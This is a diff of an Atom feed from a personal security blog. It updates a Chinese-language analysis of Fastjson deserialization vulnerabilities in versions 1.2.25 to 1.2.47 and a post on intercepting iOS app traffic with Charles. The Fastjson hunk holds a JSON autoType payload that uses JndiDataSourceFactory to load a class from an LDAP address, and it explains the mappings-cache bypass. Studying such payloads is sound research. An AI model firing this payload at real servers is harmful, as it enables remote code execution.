 &lt;h5 id=&#34;修复&#34;&gt;修复&lt;/h5&gt;
 &lt;p&gt;引入了checkAutoType安全机制，默认关闭，不能反序列化任意类。打开checkAutoType后，基于内置黑名单过滤。
 &lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211141104421.png&#34; alt=&#34;image-20221114110400340&#34;&gt;&lt;/p&gt;
@@ -320,7 +744,7 @@ terminal输出setName is running，说明整个过程中setName方法也被调�
     &amp;#34;@type&amp;#34;:&amp;#34;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&amp;#34;,
     &amp;#34;properties&amp;#34;:{&amp;#34;data_source&amp;#34;:&amp;#34;ldap://127.0.0.1:1389/VulClass&amp;#34;}
 }
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;fastjson-1247&#34;&gt;Fastjson-1.2.47&lt;/h2&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;1225fastjson1247&#34;&gt;1.2.25&amp;lt;=Fastjson&amp;lt;=1.2.47&lt;/h2&gt;
 &lt;h5 id=&#34;影响版本&#34;&gt;影响版本&lt;/h5&gt;
 &lt;ul&gt;
 &lt;li&gt;1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport不能利用&lt;/li&gt;
@@ -462,7 +886,7 @@ TypeUtils.getClassFromMapping(typeName)：
     }
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;所以只要能控制这三个参数，就可以将任意类写入mappings。loadClass有三个重载方法
 &lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211161036742.png&#34; alt=&#34;image-20221116103633697&#34;&gt;
-找三个方法在哪里被调用，再看看能否被控制。(我的idea死活找不到调用情况，望提供建议，谢谢磕头了)
+找三个方法在哪里被调用，再看看能否被控制。(下载源码包)
 最终定位到com.alibaba.fastjson.serializer.MiscCodec#deserialze.文件内定位loadClass，发现当strVal有值并且clazz为Class.class时才会进入if，然后类加载并缓存到mappings
 &lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211161108186.png&#34; alt=&#34;image-20221116110811152&#34;&gt;
 &lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202211161104279.png&#34; alt=&#34;image-20221116110440251&#34;&gt;
@@ -505,7 +929,9 @@ autoTypeSupport检测完后，现在clazz不为空，DedaultHSONParser#parseObje
         &amp;#34;autoCommit&amp;#34;: true
     }
 }
-&lt;/code&gt;&lt;/pre&gt;</content>
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Fastjsn&amp;lt;=1.2.68&lt;/p&gt;
+&lt;p&gt;mvn dependency:resolve -Dclassifier=sources&lt;/p&gt;
+</content>
             
             
             
@@ -1082,7 +1508,7 @@ shift+enter&lt;/p&gt;
             <title type="text">Iosapp抓包</title>
             <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/iosapp%E6%8A%93%E5%8C%85/" />
             <id>https://klearcc.github.io/post/iosapp%E6%8A%93%E5%8C%85/</id>
-            <updated>2022-10-13T23:03:29&#43;08:00</updated>
+            <updated>2022-11-28T19:27:37&#43;08:00</updated>
             <published>2022-09-20T21:22:27&#43;08:00</published>
             <author>
                     <name>Klear</name>
@@ -1116,7 +1542,7 @@ shift+enter&lt;/p&gt;
 开启
 &lt;img src=&#34;https://cdn.jsdelivr.net/gh/klearcc/pic/imgs202209202124968.png&#34; alt=&#34;image-20220920143722615&#34;&gt;&lt;/p&gt;
 &lt;ol start=&#34;4&#34;&gt;
-&lt;li&gt;电脑弹出对话框，选择access，手机端访问chls.pro/ssl安装证书，安装完之后在通用-关于本机-证书信任设置-对根证书启用完全信任&lt;/li&gt;
+&lt;li&gt;电脑弹出对话框，选择access，手机端访问chls.pro/ssl安装证书，安装完之后在通用-关于本机-证书信任设置-对根证书启用完全信任&amp;amp;&amp;amp;通用-关于本机-证书信任设置-针对根证书启用完全信任。&lt;/li&gt;
 &lt;/ol&gt;
 &lt;/li&gt;
 &lt;/ol&gt;
@@ -1787,63 +2213,9 @@ docker-compose up -d&lt;/p&gt;
     
         <entry>
             <title type="text"></title>
-            <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/javasec_shiro/" />
-            <id>https://klearcc.github.io/post/javasec_shiro/</id>
-            <updated>2022-10-20T17:15:27&#43;08:00</updated>
-            <published>0001-01-01T00:00:00&#43;00:00</published>
-            <author>
-                    <name>Klear</name>
-                    <uri>https://klearcc.github.io/</uri>
-                    <email>baicaix86@gmail.com</email>
-                    </author>
-            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html"></summary>
-            
-                <content type="html"></content>
-            
-            
-            
-            
-            
-                
-                    
-                
-                    
-                
-            
-        </entry>
-    
-        <entry>
-            <title type="text"></title>
             <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/javasec_struts2/" />
             <id>https://klearcc.github.io/post/javasec_struts2/</id>
             <updated>2022-10-20T17:13:50&#43;08:00</updated>
-            <published>0001-01-01T00:00:00&#43;00:00</published>
-            <author>
-                    <name>Klear</name>
-                    <uri>https://klearcc.github.io/</uri>
-                    <email>baicaix86@gmail.com</email>
-                    </author>
-            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html"></summary>
-            
-                <content type="html"></content>
-            
-            
-            
-            
-            
-                
-                    
-                
-                    
-                
-            
-        </entry>
-    
-        <entry>
-            <title type="text"></title>
-            <link rel="alternate" type="text/html" href="https://klearcc.github.io/post/untitled/" />
-            <id>https://klearcc.github.io/post/untitled/</id>
-            <updated>2022-11-10T17:19:48&#43;08:00</updated>
             <published>0001-01-01T00:00:00&#43;00:00</published>
             <author>
                     <name>Klear</name>
